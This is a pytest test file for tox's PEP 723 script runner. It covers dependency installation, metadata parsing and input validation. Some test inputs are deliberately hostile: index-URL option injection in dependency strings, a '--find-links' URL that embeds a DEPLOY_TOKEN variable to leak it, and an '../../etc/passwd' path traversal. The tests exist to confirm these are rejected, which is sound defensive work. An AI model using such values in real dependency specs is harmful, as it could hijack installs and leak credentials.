from __future__ import annotations

import json
import sys
from textwrap import dedent
from typing import TYPE_CHECKING, Final

import pytest
from packaging.requirements import Requirement

if TYPE_CHECKING:
    from unittest.mock import MagicMock

    from pytest_mock import MockerFixture

    from tox.pytest import ToxProjectCreator, ToxRunOutcome


def _tox_ini(extra: str = "") -> str:
    lines = ["[testenv:check]", "runner = virtualenv-pep-723", "script = check.py"]
    if extra:
        lines.append(extra)
    return "\n".join(lines) + "\n"


def _run(project: ToxProjectCreator, files: dict[str, str], *extra_args: str) -> tuple[ToxRunOutcome, MagicMock]:
    proj = project(files)
    execute_calls = proj.patch_execute(lambda r: 0 if "install" in r.run_id else None)
    result = proj.run("r", "-e", "check", "--discover", sys.executable, *extra_args)
    return result, execute_calls


def _py_ver() -> str:
    return f"{sys.version_info.major}.{sys.version_info.minor}"


def test_deps_installed(tox_project: ToxProjectCreator) -> None:
    script = "# /// script\n# dependencies = [\"setuptools\"]\n# ///\nprint('ok')\n"
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_success()
    install_cmds = [i[0][3].cmd for i in execute_calls.call_args_list if "install" in i[0][3].run_id]
    assert any("setuptools" in arg for cmd in install_cmds for arg in cmd)


def test_no_deps_when_only_requires_python(tox_project: ToxProjectCreator) -> None:
    script = f'# /// script\n# requires-python = ">={_py_ver()}"\n# ///\nprint("ok")\n'
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_success()
    assert not [i for i in execute_calls.call_args_list if "install" in i[0][3].run_id]


def test_no_deps_when_no_metadata(tox_project: ToxProjectCreator) -> None:
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": 'print("ok")\n'})
    result.assert_success()
    assert not [i for i in execute_calls.call_args_list if "install" in i[0][3].run_id]


def test_custom_commands_override(tox_project: ToxProjectCreator) -> None:
    script = "# /// script\n# dependencies = [\"setuptools\"]\n# ///\nprint('ok')\n"
    result, execute_calls = _run(
        tox_project,
        {"tox.ini": _tox_ini("commands = python -c \"print('custom')\""), "check.py": script},
    )
    result.assert_success()
    cmd_calls = [i[0][3].cmd for i in execute_calls.call_args_list if i[0][3].run_id == "commands[0]"]
    assert any("custom" in str(cmd) for cmd in cmd_calls)


def test_default_commands_forward_posargs(tox_project: ToxProjectCreator) -> None:
    result, execute_calls = _run(
        tox_project, {"tox.ini": _tox_ini(), "check.py": 'print("ok")\n'}, "--", "arg1", "arg2"
    )
    result.assert_success()
    cmd = next(i[0][3].cmd for i in execute_calls.call_args_list if i[0][3].run_id == "commands[0]")
    assert "arg1" in cmd
    assert "arg2" in cmd


def test_requires_python_not_satisfied(tox_project: ToxProjectCreator) -> None:
    script = '# /// script\n# requires-python = ">=99.0"\n# ///\nprint("ok")\n'
    result, _ = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_failed()
    assert "does not satisfy requires-python" in result.out


@pytest.mark.parametrize(
    "dependency",
    [
        pytest.param("setuptools", id="valid"),
        pytest.param("-i https://example.com/simple", id="invalid"),
    ],
)
def test_skip_env_install(tox_project: ToxProjectCreator, dependency: str) -> None:
    script: Final[str] = f"# /// script\n# dependencies = {json.dumps([dependency])}\n# ///\nprint('ok')\n"
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script}, "--skip-env-install")
    result.assert_success()
    assert not [i for i in execute_calls.call_args_list if "install" in i[0][3].run_id]


@pytest.mark.parametrize(
    "script",
    [
        pytest.param(
            dedent("""\
                # /// script
                # requires-python = ">=3.12"
                # ///

                # /// script
                # dependencies = []
                # ///
            """),
            id="multiple-script-blocks",
        ),
        pytest.param(
            dedent("""\
                # /// script
                # requires-python = not valid toml
                # ///
            """),
            id="malformed-toml",
        ),
        pytest.param(
            dedent("""\
                # /// script
                # dependencies = [broken
                # ///
                print('ok')
            """),
            id="unclosed-list",
        ),
    ],
)
def test_invalid_script_metadata(tox_project: ToxProjectCreator, script: str) -> None:
    result, _ = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_failed()
    assert "invalid inline script metadata" in result.out, result.out
    assert "internal error" not in result.out


@pytest.mark.parametrize(
    "dependency",
    [
        pytest.param("-i http://127.0.0.1:18931/simple", id="index-url"),
        pytest.param("--extra-index-url http://127.0.0.1:18931/simple", id="long-option"),
        pytest.param("--find-links http://127.0.0.1:18931/stolen/${DEPLOY_TOKEN}/", id="option-with-env-var"),
        pytest.param("-e .", id="editable"),
        pytest.param("demo-pkg\n--index-url http://127.0.0.1:18931/simple", id="line-break"),
        pytest.param(42, id="non-string"),
    ],
)
def test_invalid_dependency_fails_before_install(tox_project: ToxProjectCreator, dependency: str | int) -> None:
    script: Final[str] = f"# /// script\n# dependencies = {json.dumps(['demo-pkg', dependency])}\n# ///\nprint('ok')\n"
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_failed(1)
    assert f"invalid dependency {dependency!r}" in result.out, result.out
    assert "internal error" not in result.out
    assert not any("install" in call[0][3].run_id for call in execute_calls.call_args_list)


@pytest.mark.parametrize(
    "dependencies",
    [
        pytest.param(42, id="integer"),
        pytest.param("", id="empty-string"),
    ],
)
def test_invalid_dependencies_type_fails_before_install(
    tox_project: ToxProjectCreator, dependencies: str | int
) -> None:
    script: Final[str] = f"# /// script\n# dependencies = {json.dumps(dependencies)}\n# ///\nprint('ok')\n"
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_failed(1)
    assert f"invalid dependencies {dependencies!r}" in result.out
    assert not any("install" in call[0][3].run_id for call in execute_calls.call_args_list)


@pytest.mark.parametrize(
    "dependency",
    [
        pytest.param("demo-pkg>=1.0", id="version"),
        pytest.param("demo-pkg @ https://example.com/demo_pkg-1.0-py3-none-any.whl", id="direct-url"),
        pytest.param("tomli; python_version >= '3.11'", id="marker"),
    ],
)
def test_pep508_dependency_forms(tox_project: ToxProjectCreator, dependency: str) -> None:
    script: Final[str] = f"# /// script\n# dependencies = {json.dumps([dependency])}\n# ///\nprint('ok')\n"
    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
    result.assert_success()
    assert str(Requirement(dependency)) in [
        argument
        for call in execute_calls.call_args_list
        if "install" in call[0][3].run_id
        for argument in call[0][3].cmd
    ]


def test_missing_script_file(tox_project: ToxProjectCreator) -> None:
    proj = tox_project({"tox.ini": _tox_ini()})
    result = proj.run("r", "-e", "check", "--discover", sys.executable)
    result.assert_failed()
    assert "script file not found" in result.out


def test_base_python_rejected(tox_project: ToxProjectCreator) -> None:
    script = f'# /// script\n# requires-python = ">={_py_ver()}"\n# ///\n'
    result, _ = _run(
        tox_project,
        {"tox.ini": _tox_ini("base_python = python3"), "check.py": script},
    )
    result.assert_failed()
    assert "cannot set base_python" in result.out


def _tox_ini_with_script(script_value: str) -> str:
    return f"[testenv:check]\nrunner = virtualenv-pep-723\nscript = {script_value}\n"


def test_script_path_outside_tox_root_rejected(tox_project: ToxProjectCreator) -> None:
    proj = tox_project({"tox.ini": _tox_ini_with_script("../escape.py")})
    result = proj.run("r", "-e", "check", "--discover", sys.executable)
    result.assert_failed()
    assert "escapes tox_root" in result.out


def test_script_path_traversal_via_dot_dot_rejected(tox_project: ToxProjectCreator) -> None:
    proj = tox_project({"tox.ini": _tox_ini_with_script("subdir/../../etc/passwd")})
    result = proj.run("r", "-e", "check", "--discover", sys.executable)
    result.assert_failed()
    assert "escapes tox_root" in result.out


def test_script_file_too_large_rejected(tox_project: ToxProjectCreator, mocker: MockerFixture) -> None:
    script = "# /// script\n# dependencies = []\n# ///\nprint('ok')\n"
    proj = tox_project({"tox.ini": _tox_ini(), "check.py": script})
    proj.patch_execute(lambda r: 0 if "install" in r.run_id else None)
    mocker.patch("tox.tox_env.python.pep723._MAX_SCRIPT_BYTES", 1)
    result = proj.run("r", "-e", "check", "--discover", sys.executable)
    result.assert_failed()
    assert "exceeds the 1 byte limit" in result.out


def test_metadata_honored_with_bom(tox_project: ToxProjectCreator) -> None:
    """A UTF-8 BOM (common Windows editor artifact) must not silently disable the metadata block."""
    script = "\ufeff" + dedent("""\
        # /// script
        # requires-python = ">=99.0"
        # ///
        print("ok")
    """)
    tox_toml = dedent("""\
        [env.check]
        runner = "virtualenv-pep-723"
        script = "check.py"
    """)
    result, _ = _run(tox_project, {"tox.toml": tox_toml, "check.py": script})
    result.assert_failed()
    assert "does not satisfy requires-python" in result.out
